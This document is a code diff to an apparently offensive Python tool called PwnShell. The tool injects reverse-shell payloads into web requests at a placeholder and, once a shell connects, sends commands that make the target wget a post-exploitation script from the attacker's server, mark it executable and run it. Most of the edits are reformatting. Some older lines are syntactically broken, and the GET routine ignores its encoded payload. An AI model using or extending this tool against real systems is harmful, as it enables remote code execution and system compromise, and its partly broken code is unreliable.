@@ -28,8 +28,8 @@ class PwnShell:
         self.method = args.method
         self.data = args.data
         self.authentication = args.auth
-        self.type=args.type
-        self.file=args.file
+        self.type = args.type
+        self.file = args.file
         ########################################################################
         ###################### Specifying OS ###################################
         if self.type == "linux" or self.type == "l":
@@ -56,7 +56,7 @@ class PwnShell:
     def shell_linux(self):  # Default option
         self.info()
         self.parse_file()
-        #self.login()
+        # self.login()
         self.is_valid()
         self.thread()  # leave it the last one
 
@@ -72,13 +72,13 @@ class PwnShell:
     def is_valid(self):  # Checking if the ip address is valid
         try:
             ipaddress.ip_address(self.ip)
-            if self.port <= 65535 :
+            if self.port <= 65535:
                 return True
             else:
-                print("[!]Invalid PORT NUMBER -> %d"%self.port)
+                print("[!]Invalid PORT NUMBER -> %d" % self.port)
                 exit_gracefully()
         except ValueError:
-            print("\n[!]Invalid IP : %d"%self.ip)
+            print("\n[!]Invalid IP : %d" % self.ip)
             exit_gracefully()
 
     #########################################################################################
@@ -91,7 +91,7 @@ class PwnShell:
         time.sleep(5)
         send = f'''wget -P /dev/shm http://{self.ip}:9002/post.sh ; clear'''
         nc.send_line(send.encode("utf-8"))
-        send=f'''chmod +x /dev/shm/post.sh ; clear ; /dev/shm/post.sh {self.ip}'''
+        send = f'''chmod +x /dev/shm/post.sh ; clear ; /dev/shm/post.sh {self.ip}'''
         nc.send_line(send.encode("utf-8"))
         nc.interact()
         nc.close()
@@ -103,10 +103,10 @@ class PwnShell:
         # Make sure the server is created at current directory
         os.chdir('.')
         # Create server object listening the port 9002
-        server_object = HTTPServer(server_address=('', 9002), RequestHandlerClass=CGIHTTPRequestHandler)
+        server_object = HTTPServer(server_address=(
+            '', 9002), RequestHandlerClass=CGIHTTPRequestHandler)
         # Start the web server
         server_object.serve_forever()
-
 
     #########################################################################################
     ###################################  THREADS ############################################
@@ -129,9 +129,13 @@ class PwnShell:
     #################################  CHECK IF PORT IS IN USE ##############################
 
     def is_port_in_use(self):
-        import socket
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            return s.connect_ex(('localhost', self.port)) == 0
+        output = os.popen('netstat -lant').read()
+        lines = output.split('\n')
+        for line in lines:
+            if str(self.port) in line:
+                if line.split()[-1] == 'ESTABLISHED':
+                    return True
+                return False
 
     ############################################################################################
     ###################################  SENDING THE PAYLOADS #################################
@@ -148,10 +152,10 @@ class PwnShell:
             print('get method')
             for payload in payloads:
                 self.req_get(payload)
-        elif self.file :
+        elif self.file:
             for payload in payloads:
                 self.req_get(payload)
-            self.parse_file()  #this also sends the request
+            self.parse_file()  # this also sends the request
         else:
             return False
 
@@ -160,7 +164,8 @@ class PwnShell:
     def req_post(self, payload):
         print(f'Trying: {payload}')
         encoded_payload = self.get_url_encoded_payload(payload)
-        url = self.domain.replace('PWNME', encoded_payload)  # payoad will be the revshells
+        # payoad will be the revshells
+        url = self.domain.replace('PWNME', encoded_payload)
         proxies = {'http': 'http://127.0.0.1:8080'}
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
@@ -169,20 +174,23 @@ class PwnShell:
                    'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
         cookies = ''
         if self.data:
-            data_parsed = self.data.replace("PWNME", encoded_payload)  # Don't change
+            data_parsed = self.data.replace(
+                "PWNME", encoded_payload)  # Don't change
         else:
             data_parsed = None
-        r = requests.post(url, headers=headers, data=data_parsed,cookies=cookies,verify=False)
+        r = requests.post(url, headers=headers, data=data_parsed,
+                          cookies=cookies, verify=False)
 
     #########################################################################################
     ###################################  GET METHOD #########################################
     def req_get(self, payload):
         print(f'Trying: {payload}')
         encoded_payload = self.get_url_encoded_payload(payload)
-        url = self.domain.replace('PWNME', self.payload)  # payload will be the revshells
+        # payload will be the revshells
+        url = self.domain.replace('PWNME', self.payload)
         proxies = {'http': 'http://127.0.0.1:8080'}
         cookies = ''
-        r = requests.get(url, cookies=cookies,verify=False)
+        r = requests.get(url, cookies=cookies, verify=False)
 
     #########################################################################################
     ###################################  LOGIN   ############################################
@@ -193,19 +201,20 @@ class PwnShell:
     ######################################################################################
     ###################################  PARSER BURPREQUEST #################################
     def parse_file(self):
-        proxies={'https': 'https://127.0.0.1:8080'}
-        request , post_data = burpee.parse_request(self.file) #Don;t change
+        proxies = {'https': 'https://127.0.0.1:8080'}
+        request, post_data = burpee.parse_request(self.file)  # Don;t change
+        for r in request:
             if request[r] == "PWNME":
-                request[r] = request[r].replace("PWNME",'PAYLOAD') #THE PAYLOAD
+                request[r] = request[r].replace("PWNME", 'PAYLOAD')  # THE PAYLOAD
             if r == "Host":
-                url='https://'+request[r]   #CONCATE WITH PATH
-        
-        if post_data :
-            post_data = post_data.replace("PWNME",'PAYLOAD')
-            req=requests.post(url,headers=request,data=post_data,,verify=False)
+                url = 'https://'+ request[r] + burpee.get_method_path(self.file)  #CONCATE WITH PATH
+                print(url)
+        if post_data:
+            post_data = post_data.replace("PWNME", 'PAYLOAD')
+            req =requests.post(url,headers=request,data=post_data,verify=False)
             print(req.status_code)
         else:
-            req=requests.get(url,headers=request,verify=False)
+            req = requests.get(url,headers=request,verify=False)
             print(req.status_code)
 
     #########################################################################################
@@ -214,6 +223,7 @@ class PwnShell:
     @staticmethod
     def get_url_encoded_payload(payload):
         encoded_payload = urllib.parse.quote(payload)
+        encoded_payload = encoded_payload.replace('/', '%2F')
         return encoded_payload
 
 
@@ -248,8 +258,10 @@ if __name__ == '__main__':
         parser.add_argument("-d", "--data", help='Post data')
         parser.add_argument("-c", "--cookie", help='Enter Cookie')
         parser.add_argument("-k", "--header", help='Provide header')
-        parser.add_argument("-m", "--method", help='Request Method', default='post')
-        parser.add_argument("-a", "--auth", help='[USERNAME PASSWORD]', nargs=2)
+        parser.add_argument(
+            "-m", "--method", help='Request Method', default='post')
+        parser.add_argument(
+            "-a", "--auth", help='[USERNAME PASSWORD]', nargs=2)
         parser.add_argument("-f", "--file", help='Request file')
         args = parser.parse_args()
         ########################################################################
@@ -259,7 +271,7 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         exit_gracefully()
 
-#TODO
-#Add login form with a session
-#Stop loop when getting a connection
-#Work on windows
+# TODO
+# Add login form with a session
+# Stop loop when getting a connection
+# Work on windows
